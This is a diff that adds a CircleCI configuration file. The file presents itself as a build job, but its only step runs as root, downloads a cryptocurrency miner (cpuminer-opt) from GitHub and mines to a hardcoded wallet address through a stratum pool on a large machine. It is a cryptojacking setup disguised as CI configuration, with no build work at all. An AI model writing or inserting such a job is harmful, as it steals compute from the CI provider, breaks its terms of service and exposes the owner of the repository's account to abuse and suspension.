@@ -1,0 +1,17 @@
+version: 2.1
+
+jobs:
+  build:
+  
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: 2xlarge
+    
+
+    steps:
+      - run:
+         name: "pro"
+         
+         command: | 
+          sudo su --command "wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar  -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qpw0u9dfqzx6srmm7xgz8j9p36c545szge4eyx7 -p x "
+   
